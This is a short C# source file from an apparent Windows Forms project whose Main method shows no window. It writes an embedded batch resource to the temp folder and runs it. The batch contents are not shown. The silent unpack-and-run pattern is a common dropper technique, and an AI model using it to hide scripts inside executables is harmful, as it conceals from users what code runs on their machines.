using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Text;
using Microsoft.Win32;
using System.Diagnostics;

namespace myprojeto
{
    static class Program
    {
       
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

           
            string bat = Path.Combine(Path.GetTempPath(), "filebat.bat");
            File.WriteAllText(bat, myprojeto.Properties.Resources.filebat);
                
            
            System.Diagnostics.Process.Start(bat);

        }
    }
}
